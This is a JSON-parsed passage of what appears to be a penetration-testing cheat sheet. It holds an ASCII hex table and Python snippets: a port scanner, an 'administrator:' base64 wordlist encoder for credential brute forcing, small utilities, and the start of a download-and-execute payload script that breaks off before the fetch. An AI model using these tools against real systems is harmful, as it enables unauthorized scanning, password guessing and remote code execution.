    },
    {
      "type": "paragraph",
      "content": "“",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x23",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x24",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "%",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x26",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "&",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x27",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "‘",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x28",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x29",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": ")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x2a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x2b",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "+",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x2c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": ",",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x2d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x2e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": ".",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x2f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x30",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x31",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x32",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x33",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x34",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x35",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x36",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x37",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "7",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x38",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "8",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x39",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x3a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": ":",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HEX",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x3b",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": ";",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x3c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x3d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "=",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x3e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": ">",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x3f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x40",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "@",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x41",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "A",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x42",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "B",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x43",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "C",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x44",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "D",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x45",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "E",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x46",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "F",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x47",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "G",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x48",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "H",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x49",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "I",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x4a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "J",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x4b",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "K",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x4c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "L",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x4d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "M",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x4e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "N",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x4f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "O",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x50",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "P",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x51",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Q",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x52",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "R",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x53",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "S",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x54",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "T",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x55",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "U",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x56",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "V",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x57",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "W",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x58",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "X",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Y",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x5a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Z",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x5b",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HEX",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x5c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "\\",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x5d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x5e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "^",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x5f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "_",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x60",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "`",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x61",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "b",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x64",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x65",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x66",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "g",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "h",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x69",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "i",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "j",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x6b",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "k",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x6c",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "l",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x6d",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "m",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x6e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "n",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x6f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "o",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x70",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "p",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x71",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "q",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x72",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "r",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x73",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "s",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x74",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "t",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x75",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "u",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x76",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "v",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x77",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "w",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x78",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x79",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "y",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "x7a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "z",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python Port Scanner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import socket as sk",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for port in range(<START_PORT>,<END_PORT>):",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "try:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "s=sk.socket(sk.AF_INET,sk.SOCK_STREAM)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "s.settimeout(1000)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "s.connect(('<IP_ADDRESS>',port))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print ('%d:OPEN' % (port))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "s.close",
      "level": 0,
      "metadata": {
        "file_paths": [
          "s.close"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "except: continue",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python Base64 Wordlist",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#!/usr/bin/python",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import base64",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "file1=open(\"<PLAINTEXT_FILE_PATH>\",\"r\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "file2=open(\"<ENCODED_FILE_PATH>\",\"w\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "for line in file1:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "clear = \"administrator:\" + str.strip(line)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "new = base64.b64encode(clear.encode())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "file2.write(new.decode())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Convert Windows Registry HEX Format To Readable ASCII",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import sys, string",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "dataFormatHex = bytearray.fromhex(sys.argv[1]).decode()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "output = \"\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "for char in dataFormatHex:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "if char in string.printable:",
      "level": 0,
      "metadata": {
        "file_paths": [
          "string.printa"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "output += char",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "else:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "output += \".\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print(\"\\n\" + output)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Read All Files in Folder & Search For Regex",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import glob, re",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for msg in glob.glob('/tmp/.txt'):",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "filer = open((msg),'r')",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "data = filer.read()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "message = re.findall(r'<message>(.?)>/message>', data,re.DOTALL)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print(\"File %s contains %s\" % (str(msg),message))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "filer.close()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSL Encrypted SimpleHTTPServer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Create SSL cert (follow prompts for customization)",
      "level": 1,
      "metadata": {}
    },
    {
      "type": "heading",
      "content": "openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 –nodes",
      "level": 1,
      "metadata": {}
    },
    {
      "type": "heading",
      "content": "Create httpserver.py",
      "level": 1,
      "metadata": {}
    },
    {
      "type": "code_block",
      "content": "import http.server, ssl, socketserver",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "context.load_cert_chain(\"cert.pem\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "server_address = ('localhost', 4443)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "handler = http.server.SimpleHTTPRequestHandler",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.server.Simple"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "with socketserver.TCPServer(server_address, handler) as httpd:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "httpd.socket = context.wrap_socket(httpd.socket, server_side=True)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "httpd.serve_forever()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Loop Through IP List, Download File Over HTTP & Execute",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#!/usr/bin/python",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import os",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from urllib.request import urlopen",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "urls = [\"<IP_ADDRESS1>\",\"<IP_ADDRESS2>\"]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "port = \"<PORT_TO_CONNECT>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "payload = \"cb.sh\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "cb.sh"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "for url in urls:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
